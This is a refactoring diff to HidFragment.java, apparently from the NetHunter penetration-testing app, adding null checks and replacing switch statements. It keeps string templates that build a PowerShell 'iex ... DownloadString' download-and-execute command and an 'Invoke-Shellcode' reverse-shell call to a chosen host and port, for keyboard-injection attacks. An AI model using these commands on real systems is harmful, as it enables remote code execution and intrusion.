@@ -26,9 +26,11 @@ import com.offsec.nethunter.utils.ShellExecuter;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.OutputStreamWriter;
+import java.util.Objects;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AlertDialog;
 import androidx.fragment.app.Fragment;
 import androidx.fragment.app.FragmentManager;
@@ -59,7 +61,7 @@ public class HidFragment extends Fragment {
     public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
 
         View rootView = inflater.inflate(R.layout.hid, container, false);
-        HidFragment.TabsPagerAdapter tabsPagerAdapter = new TabsPagerAdapter(getActivity().getSupportFragmentManager());
+        HidFragment.TabsPagerAdapter tabsPagerAdapter = new TabsPagerAdapter(Objects.requireNonNull(getActivity()).getSupportFragmentManager());
 
         mViewPager = rootView.findViewById(R.id.pagerHid);
         mViewPager.setAdapter(tabsPagerAdapter);
@@ -70,7 +72,7 @@ public class HidFragment extends Fragment {
         mViewPager.addOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
             @Override
             public void onPageSelected(int position) {
-                getActivity().invalidateOptionsMenu();
+                Objects.requireNonNull(getActivity()).invalidateOptionsMenu();
             }
         });
         setHasOptionsMenu(true);
@@ -82,17 +84,17 @@ public class HidFragment extends Fragment {
 
 
     @Override
-    public void onCreateOptionsMenu(Menu menu, MenuInflater inflater) {
+    public void onCreateOptionsMenu(@NonNull Menu menu, MenuInflater inflater) {
         inflater.inflate(R.menu.hid, menu);
     }
 
 
-    public void onPrepareOptionsMenu(Menu menu) {
+    public void onPrepareOptionsMenu(@NonNull Menu menu) {
         int pageNum = mViewPager.getCurrentItem();
-        if (pageNum == 0) {
-            menu.findItem(R.id.source_button).setVisible(true);
-        } else {
+        if (pageNum != 0) {
             menu.findItem(R.id.source_button).setVisible(false);
+        } else {
+            menu.findItem(R.id.source_button).setVisible(true);
         }
         getActivity().invalidateOptionsMenu();
     }
@@ -252,7 +254,7 @@ public class HidFragment extends Fragment {
 
         int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);
 
-        AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
+        AlertDialog.Builder builder = new AlertDialog.Builder(Objects.requireNonNull(getActivity()));
         builder.setTitle("Keyboard Layout:");
         builder.setPositiveButton("OK", (dialog, which) -> {
 
@@ -323,30 +325,27 @@ public class HidFragment extends Fragment {
         }
 
         public void onClick(View v) {
-            switch (v.getId()) {
-                case R.id.powersploitOptionsUpdate:
-                    if (getView() == null) {
-                        return;
-                    }
-                    ShellExecuter exe = new ShellExecuter();
-                    EditText ip = getView().findViewById(R.id.ipaddress);
-                    EditText port = getView().findViewById(R.id.port);
+            if (v.getId() == R.id.powersploitOptionsUpdate) {
+                if (getView() == null) {
+                    return;
+                }
+                ShellExecuter exe = new ShellExecuter();
+                EditText ip = getView().findViewById(R.id.ipaddress);
+                EditText port = getView().findViewById(R.id.port);
 
-                    Spinner payload = getView().findViewById(R.id.payload);
-                    String payloadValue = payload.getSelectedItem().toString();
+                Spinner payload = getView().findViewById(R.id.payload);
+                String payloadValue = payload.getSelectedItem().toString();
 
-                    EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
-                    String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
+                EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
+                String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
+                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
-                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved) {
-                        nh.showMessage("Source not updated (configFileUrlPath)");
-                    }
-                    break;
-                default:
-                    nh.showMessage("Unknown click");
-                    break;
+                Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                if (!isSaved) {
+                    nh.showMessage("Source not updated (configFileUrlPath)");
+                }
+            } else {
+                nh.showMessage("Unknown click");
             }
         }
 
@@ -517,15 +516,13 @@ public class HidFragment extends Fragment {
 
         @Override
         public void onActivityResult(int requestCode, int resultCode, Intent data) {
-            switch (requestCode) {
-                case PICKFILE_RESULT_CODE:
-                    if (resultCode == Activity.RESULT_OK && getView() != null) {
-                        String FilePath = data.getData().getPath();
-                        EditText source = getView().findViewById(R.id.windowsCmdSource);
-                        exe.ReadFile_ASYNC(FilePath, source);
-                        nh.showMessage("Script loaded");
-                    }
-                    break;
+            if (requestCode == PICKFILE_RESULT_CODE) {
+                if (resultCode == Activity.RESULT_OK && getView() != null) {
+                    String FilePath = data.getData().getPath();
+                    EditText source = getView().findViewById(R.id.windowsCmdSource);
+                    exe.ReadFile_ASYNC(FilePath, source);
+                    nh.showMessage("Script loaded");
+                }
             }
         }
     }
@@ -546,23 +543,20 @@ public class HidFragment extends Fragment {
         }
 
         public void onClick(View v) {
-            switch (v.getId()) {
-                case R.id.powershellOptionsUpdate:
-                    if (getView() == null) {
-                        return;
-                    }
-                    ShellExecuter exe = new ShellExecuter();
-                    EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
+            if (v.getId() == R.id.powershellOptionsUpdate) {
+                if (getView() == null) {
+                    return;
+                }
+                ShellExecuter exe = new ShellExecuter();
+                EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
+                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
 
-                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved) {
-                        nh.showMessage("Source not updated (configFileUrlPath)");
-                    }
-                    break;
-                default:
-                    nh.showMessage("Unknown click");
-                    break;
+                Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                if (!isSaved) {
+                    nh.showMessage("Source not updated (configFileUrlPath)");
+                }
+            } else {
+                nh.showMessage("Unknown click");
             }
         }
 
